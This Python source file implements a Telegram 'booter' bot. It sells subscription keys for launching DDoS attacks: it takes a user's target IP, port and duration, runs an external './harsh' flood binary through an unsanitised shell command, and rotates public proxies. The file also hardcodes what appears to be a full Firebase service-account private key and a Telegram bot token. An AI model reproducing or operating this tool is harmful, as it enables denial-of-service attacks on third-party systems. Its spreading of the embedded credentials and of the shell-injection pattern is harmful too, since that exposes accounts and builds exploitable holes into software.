
import telebot
import subprocess
import firebase_admin
from firebase_admin import credentials, firestore
from datetime import datetime, timedelta, timezone
import secrets
import time
import threading
import requests
import itertools
import logging
import asyncio

REQUEST_INTERVAL = 1
logging.basicConfig(level=logging.ERROR, format='%(asctime)s - %(levelname)s - %(message)s')

# Firebase credentials (note: the private key should be stored securely)
firebase_credentials = {
  "type": "service_account",
  "project_id": "anik-8030b",
  "private_key_id": "74741bc345e265e0dc9b307ed2f731634a55af1f",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDEIaRPo4dVXcdI\n14Ill/0rWqYxcwxcmM1waRw9sbK9xYvyJ+KqlIpgJq5WUKBP2axCmnZUNtQj2U2E\nKA89k3Rhq46OgY32G/bAgxN3CxZMBq4Cin2CV1uIs7UNhTOwaUhwpeUEavqQslj7\niUtDIEReKLEgXIO73ZPuo6qjBm5bpyP9tsbou/mIvnTCssOhk2k5qju11steimFl\nx4G5tvo9zqkONkIprv0RjBmf+lqs9iD4avjFui5KrjjfrvGoorCev5A7W+sf7iSb\nJumXacInrosylRDVD51u5zc5pBycK69h0pR60dsB14isJxmpRfkYvhSCx1pQSVef\ntI22B7IXAgMBAAECggEAHk2LAy74mEJD/xzPo+/8ErhlGHDLxnwUCbvZEYMkuFi5\noEbJ/kxdpjDJG4GbiJrQwv2gg1nGpGn3pbqWwuRxxSwU0NnIIu/7y49fm4if/6EX\nPkHtgGJE5zXKJyD0dTDfG2CA+5IXzUbGTsl4p7y9iMVwEILwFj+hkpZrpS03hyYM\n2NZdCWrxrynln7mRNkI5XUJcgk1r6nvZhUDZDgwBMiPfIekYO9YlgEf9YjnYK2Fj\nhIVjAwTIeiep2b38M2pYlENeIv7TIaZ3Er3i4qR9rRelLkWZvNIuzVD76o0OdvZx\n4pb0xFAZvw63vEXgIYOlfIsBV8gl5O/OpmGjK2aB4QKBgQDqi/DrnA9lUb0z/37u\n7YMsJNKTxzV4dWoEESyBsOzvVvZe5zar2fjO2gwkmM8fGTT8CmSdsP3qGg06uoLW\n2GfK/oYu57FOiGevcIsjdptHOlbjZfAC9A8TbA4abqozsBbjfIJSczCrvo3rYHIx\nKPeaBWS/WvQhtSlbH7LBMtIPcQKBgQDWEi8EbCasR+dvzBAziH/caj6WBiCqTAuK\nUEGLKliCs9CqFC7Ad5Sjpo+ZNtH56/vk+e9pSa6EYhx2ftgioeHaV87/wwCPUKtP\nND34H4ZGO4YiXrkPiXFxRb30EyqPncJN4SmtM/plWJjjWEGrdbw/iQ0ESG1EDoMt\n3x7CKaamBwKBgCybUMZ+d68dTI6HGOz33uqWVjYkvNab/f2oBn7j1yvtrg1+i7dD\nTT6J2aVcKogPkzQcBea3spLDQaDZt+iEX7kLjxl8lwwIhS+oh83G0OFLBxtYV704\nDWX0Nvpv8Y7C/pdlJqPnpGoFY5hQT2dqEy0HuZFrCuMeQS9DaAu2Tp0BAoGBAJra\nrIhWc+NMYG7O/ylIJLYdZQjBhf+q4u47AC7bgwuJZ/iggPFZj3ySkG4U6fAQdTc+\nVaGkW0oIbu6I83CaCfcYbfU16sHBaSryb6F9rHRButZCDzzd/+IgwTg+ZRte05/i\nsXNJlmiZnn9W6KpPkM2lJnViryf8F4inTmjGGHchAoGAR/6JhSXQ0sNXJxFKpyrN\nfzJ4aqQWQ+3nI3jV0Jj511IMVpui6FEYk3u36kdE/UQTPXAD6StNkgNcE/ebcqn4\neRxyqU71py6XG6lapAxxCVUS82k0mt0nnERmZPseLWligND21lsIvyKxKOAG96nA\nnR52O62QHKNVt0KVi+xV1RA=\n-----END PRIVATE KEY-----\n",
  "client_email": "firebase-adminsdk-7a3hb@anik-8030b.iam.gserviceaccount.com",
  "client_id": "104530512164984497544",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-7a3hb%40anik-8030b.iam.gserviceaccount.com",
  "universe_domain": "googleapis.com"
}

# Initialize Firebase
cred = credentials.Certificate(firebase_credentials)
firebase_admin.initialize_app(cred)
db = firestore.client()

bot_token = '7648560677:AAGplWv0vqjLXonqb-30JnpCetkZaJglQLM'  # Replace with your bot token
proxy_api_url = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http,socks4,socks5&timeout=500&country=all&ssl=all&anonymity=all'

# Global iterator for proxies
proxy_iterator = None
current_proxy = None

def get_proxies():
    global proxy_iterator
    try:
        response = requests.get(proxy_api_url)
        if response.status_code == 200:
            proxies = response.text.splitlines()
            if proxies:
                proxy_iterator = itertools.cycle(proxies)
                return proxy_iterator
    except Exception as e:
        print(f"Error fetching proxies: {str(e)}")
    return None

def get_next_proxy():
    global proxy_iterator
    if proxy_iterator is None:
        proxy_iterator = get_proxies()
    return next(proxy_iterator, None)

def rotate_proxy(sent_message):
    global current_proxy
    while sent_message.time_remaining > 0:
        new_proxy = get_next_proxy()
        if new_proxy:
            current_proxy = new_proxy
            bot.proxy = {
                'http': f'http://{new_proxy}',
                'https': f'https://{new_proxy}'
            }
            if sent_message.time_remaining > 0:
                new_text = f"🚀⚡ ATTACK STARTED⚡🚀\n\n🎯 Target: {sent_message.target}\n🔌 Port: {sent_message.port}\n⏰ Time: {sent_message.time_remaining} Seconds\n🛡️ Proxy: RUNNING ON NOVA SERVER\n"
                try:
                    bot.edit_message_text(new_text, chat_id=sent_message.chat.id, message_id=sent_message.message_id)
                except telebot.apihelper.ApiException as e:
                    if "message is not modified" not in str(e):
                        print(f"Error updating message: {str(e)}")
        time.sleep(5)

bot = telebot.TeleBot(bot_token)

ADMIN_IDS = [2067727121, 6074152428] # Replace with the actual admin's user ID

def generate_one_time_key():
    return secrets.token_urlsafe(16)

def validate_key(key):
    doc_ref = db.collection('keys').document(key)
    doc = doc_ref.get()
    if doc.exists and not doc.to_dict().get('used', False):
        return True, doc_ref
    return False, None

def set_key_as_used(doc_ref):
    doc_ref.update({'used': True})

def check_key_expiration(user_ref):
    user_doc = user_ref.get()
    if user_doc.exists:
        user_data = user_doc.to_dict()
        expiry_date = user_data.get('expiry_date')
        if expiry_date:
            now = datetime.now(timezone.utc)  # Make current time offset-aware
            if now > expiry_date:
                # Key has expired
                user_ref.update({'valid': False})
                return False
            return user_data.get('valid', False)
    return False

@bot.message_handler(commands=['start'])
def handle_start(message):
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        telebot.types.KeyboardButton("🔥 Attack"),
        telebot.types.KeyboardButton("🛑 Stop"),
        telebot.types.KeyboardButton("📞 Contact Admin"),
        telebot.types.KeyboardButton("🔑 Generate Key"),
        telebot.types.KeyboardButton("📋 Paste Key"),
        telebot.types.KeyboardButton("👤 My Account"),
        telebot.types.KeyboardButton("⚙️ Admin Panel")
    )
    bot.send_message(message.chat.id, "*Choose an option:*", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if message.text == "🔥 Attack":
        handle_attack_init(message)
    elif message.text == "🛑 Stop":
        handle_stop(message)
    elif message.text == "📞 Contact Admin":
        handle_contact_admin(message)
    elif message.text == "🔑 Generate Key":
        handle_generate_key(message)
    elif message.text == "📋 Paste Key":
        handle_paste_key(message)
    elif message.text == "👤 My Account":
        handle_my_account(message)
    elif message.text == "⚙️ Admin Panel":
        handle_admin_panel(message)
    elif message.text == "🔙 Back":
        handle_start(message)
    elif message.text == "❌ Delete Key":
        handle_delete_key_prompt(message)
    elif message.text == "🗑️ Delete All":
        handle_delete_all(message)

def handle_attack_init(message):
    bot.send_message(message.chat.id, "Enter the target IP, port, and time in the format: <IP> <port> <time>")
    bot.register_next_step_handler(message, process_attack)

def process_attack(message):
    try:
        command_parts = message.text.split()
        if len(command_parts) < 3:
            bot.reply_to(message, "Usage: <IP> <port> <time>")
            return

        username = message.from_user.username
        user_id = message.from_user.id
        target = command_parts[0]
        port = command_parts[1]
        attack_time = int(command_parts[2])

        user_ref = db.collection('users').document(str(user_id))
        if not check_key_expiration(user_ref):
            bot.reply_to(message, "*🚫 Your subscription has expired or is invalid 🚫.\n\nPlease contact @Anik_x_pro / @Nooobfk*", parse_mode='Markdown')
            return

        response = f"@{username}\n⚡ ATTACK STARTED ⚡\n\n🎯 Target: {target}\n🔌 Port: {port}\n⏰ Time: {attack_time} Seconds\n🛡️ Proxy: RUNNING ON NOVA SERVER\n"
        sent_message = bot.reply_to(message, response)
        sent_message.target = target
        sent_message.port = port
        sent_message.time_remaining = attack_time

        # Start attack immediately in a separate thread
        attack_thread = threading.Thread(target=run_attack, args=(target, port, attack_time, sent_message))
        attack_thread.start()

        # Start updating remaining time in another thread
        time_thread = threading.Thread(target=update_remaining_time, args=(attack_time, sent_message))
        time_thread.start()

        # Start rotating proxies in a separate thread
        proxy_thread = threading.Thread(target=rotate_proxy, args=(sent_message,))
        proxy_thread.start()

    except Exception as e:
        bot.reply_to(message, f"⚠️ An error occurred: {str(e)}")

def run_attack(target, port, attack_time, sent_message):
    try:
        full_command = f"./harsh {target} {port} {attack_time} 900"
        subprocess.run(full_command, shell=True)

        sent_message.time_remaining = 0
        final_response = f"🚀⚡ ATTACK FINISHED ⚡🚀"
        try:
            bot.edit_message_text(final_response, chat_id=sent_message.chat.id, message_id=sent_message.message_id)
        except telebot.apihelper.ApiException as e:
            if "message is not modified" not in str(e):
                print(f"Error updating message: {str(e)}")

    except Exception as e:
        bot.send_message(sent_message.chat.id, f"⚠️ An error occurred: {str(e)}")

def update_remaining_time(attack_time, sent_message):
    global current_proxy
    last_message_text = None
    for remaining in range(attack_time, 0, -1):
        if sent_message.time_remaining > 0:
            sent_message.time_remaining = remaining
            new_text =  f"🚀⚡ ATTACK STARTED ⚡🚀\n\n🎯 Target: {sent_message.target}\n🔌 Port: {sent_message.port}\n⏰ Time: {remaining} Seconds\n🛡️ Proxy: RUNNING ON NOVA SERVER\n"
            
            # Update the message only if the new text is different from the last message text
            if new_text != last_message_text:
                try:
                    bot.edit_message_text(new_text, chat_id=sent_message.chat.id, message_id=sent_message.message_id)
                    last_message_text = new_text
                except telebot.apihelper.ApiException as e:
                    if "message is not modified" not in str(e):
                        print(f"Error updating message: {str(e)}")
        
        time.sleep(1)

    # Once the loop is finished, indicate the attack is finished without showing the details box
    final_response = f"🚀⚡ ATTACK FINISHED⚡🚀"
    try:
        if final_response != last_message_text:
            bot.edit_message_text(final_response, chat_id=sent_message.chat.id, message_id=sent_message.message_id)
    except telebot.apihelper.ApiException as e:
        if "message is not modified" not in str(e):
            print(f"Error updating message: {str(e)}")

def handle_stop(message):
    subprocess.run("pkill -f anik", shell=True)
    bot.reply_to(message, "*🛑 Attack stopped.*", parse_mode='Markdown')

def handle_contact_admin(message):
    bot.reply_to(message, f"*🔆 Contact Admins 🔆\n\n🔱 ADMIN #1:- @ANIK_X_PRO\n🔱 ADMIN #2:- @NOOOBFK*", parse_mode='Markdown')

def handle_generate_key(message):
    if message.from_user.id in ADMIN_IDS:
        bot.send_message(message.chat.id, "Enter the duration for the key in the format: <days> <hours> <minutes> <seconds>")
        bot.register_next_step_handler(message, process_generate_key)
    else:
        bot.reply_to(message, "*🚫 You do not have permission to generate keys.*", parse_mode='Markdown')

def process_generate_key(message):
    try:
        parts = message.text.split()
        if len(parts) != 4:
            bot.reply_to(message, "Usage: <days> <hours> <minutes> <seconds>")
            return

        days = int(parts[0])
        hours = int(parts[1])
        minutes = int(parts[2])
        seconds = int(parts[3])
        expiry_date = datetime.now(timezone.utc) + timedelta(days=days, hours=hours, minutes=minutes, seconds=seconds)

        key = f"GENERATED_{generate_one_time_key()}"
        db.collection('keys').document(key).set({'expiry_date': expiry_date, 'used': False})

        bot.reply_to(message, f"*🔑 Generated Key:* `{key}`", parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"⚠️ An error occurred: {str(e)}")

def handle_paste_key(message):
    bot.send_message(message.chat.id, "*🔑 Enter the key:*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_paste_key)

def process_paste_key(message):
    key = message.text
    valid, doc_ref = validate_key(key)
    if valid:
        # Get the current user's ID and username
        user_id = str(message.from_user.id)
        username = message.from_user.username or "UNKNOWN"

        # Set the key as used and update the user information
        set_key_as_used(doc_ref)

        # Update the key document with the user who validated the key
        doc_ref.update({
            'user_id': user_id,
            'username': username
        })

        # Get the expiry date from the key document
        expiry_date = doc_ref.get().to_dict().get('expiry_date')

        # Update the user's document in the 'users' collection
        db.collection('users').document(user_id).set({
            'valid': True,
            'expiry_date': expiry_date
        }, merge=True)

        bot.reply_to(message, "*✅ Key validated. You can now use the attack feature.*", parse_mode='Markdown')
    else:
        bot.reply_to(message, "*❌ Invalid or used key.*", parse_mode='Markdown')

def handle_my_account(message):
    user_id = str(message.from_user.id)
    user_ref = db.collection('users').document(user_id)

    if not check_key_expiration(user_ref):
        bot.reply_to(message, "*🚫 Your subscription has expired or is invalid.*", parse_mode='Markdown')
        return

    user_doc = user_ref.get()
    if user_doc.exists:
        user_data = user_doc.to_dict()
        bot.reply_to(message, f"*👤Account info:*\n\n✅ *Valid:* {user_data['valid']}\n📅 *Expiry Date:* {user_data['expiry_date']}", parse_mode='Markdown')
    else:
        bot.reply_to(message, "*❓ No account information found.*\n\nCONTACT: @TeamNovaDdos")

def handle_admin_panel(message):
    if message.from_user.id in ADMIN_IDS:
        bot.send_message(message.chat.id, "*⚙️ Fetching data... Please wait.*", parse_mode='Markdown')
        time.sleep(1)

        keys = db.collection('keys').stream()
        user_keys_info = []
        keys_dict = {}

        for idx, key in enumerate(keys):
            key_data = key.to_dict()
            key_id = key.id
            user_id = key_data.get('user_id', 'N/A')
            username = key_data.get('username', 'N/A')
            used = key_data.get('used', 'N/A')
            expiry_date = key_data.get('expiry_date', 'N/A')
            
            user_keys_info.append(f"{idx + 1}. 🔑 Key: {key_id}\n\n   👤 UserID: {user_id}\n   🧑 Username: @{username}\n   🔄 Used: {used}\n   📅 Expiry: {expiry_date}\n" )
            keys_dict[idx + 1] = key_id

        if not hasattr(bot, 'user_data'):
            bot.user_data = {}
        bot.user_data[message.chat.id] = keys_dict

        chunk_size = 10
        for i in range(0, len(user_keys_info), chunk_size):
            chunk = user_keys_info[i:i + chunk_size]
            bot.send_message(message.chat.id, "\n".join(chunk))

        markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
        markup.add(
            telebot.types.KeyboardButton("🔙 Back"),
            telebot.types.KeyboardButton("❌ Delete Key"),
            telebot.types.KeyboardButton("🗑️ Delete All")
        )
        bot.send_message(message.chat.id, "Choose an option:", reply_markup=markup)
    else:
        bot.reply_to(message, "*🚫 You do not have permission to access the admin panel.*", parse_mode='Markdown')

def handle_delete_key_prompt(message):
    bot.send_message(message.chat.id, "Enter the key number to delete:")
    bot.register_next_step_handler(message, process_delete_key)

def process_delete_key(message):
    try:
        key_number = int(message.text)
        keys_dict = bot.user_data.get(message.chat.id, {})

        if key_number in keys_dict:
            key_id = keys_dict[key_number]
            key_doc = db.collection('keys').document(key_id)
            key_data = key_doc.get().to_dict()

            if key_data:
                user_id = key_data.get('user_id', 'N/A')

                # Delete the key and revoke the user's access
                key_doc.delete()

                if user_id != 'N/A':
                    db.collection('users').document(user_id).update({'valid': False})
                    bot.reply_to(message, f"*❌ Key {key_id} deleted and user access revoked.*", parse_mode='Markdown')
                else:
                    bot.reply_to(message, "*⚠️ Invalid user ID associated with the key.*", parse_mode='Markdown')
            else:
                bot.reply_to(message, "*❓ Key not found.*", parse_mode='Markdown')
        else:
            bot.reply_to(message, "*❌ Invalid key number.*", parse_mode='Markdown')
    except ValueError:
        bot.reply_to(message, "*Please enter a valid key number.*", parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"*⚠️ An error occurred: {str(e)}*", parse_mode='Markdown')

def handle_delete_all_prompt(message):
    bot.send_message(message.chat.id, "Are you sure you want to delete all keys and revoke all users? Type 'Yes' to confirm.")
    bot.register_next_step_handler(message, process_delete_all)

def process_delete_all(message):
    if message.text.lower() == 'yes':
        try:
            # Delete all keys
            keys = db.collection('keys').stream()
            for key in keys:
                key_data = key.to_dict()
                user_id = key_data.get('user_id', 'N/A')
                key.reference.delete()

                # Revoke user access if user_id is valid
                if user_id != 'N/A':
                    user_ref = db.collection('users').document(user_id)
                    user_ref.update({'valid': False})

            bot.reply_to(message, "*🗑️ All keys deleted and all user accesses revoked.*", parse_mode='Markdown')
        except Exception as e:
            bot.reply_to(message, f"⚠️ An error occurred: {str(e)}")
    else:
        bot.reply_to(message, "*❌ Operation canceled.*", parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "🗑️ Delete All")
def handle_delete_all(message):
    if message.from_user.id in ADMIN_IDS:
        handle_delete_all_prompt(message)
    else:
        bot.reply_to(message, "*🚫 You do not have permission to perform this action.*", parse_mode='Markdown')

# Start polling
while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        asyncio.sleep(REQUEST_INTERVAL)
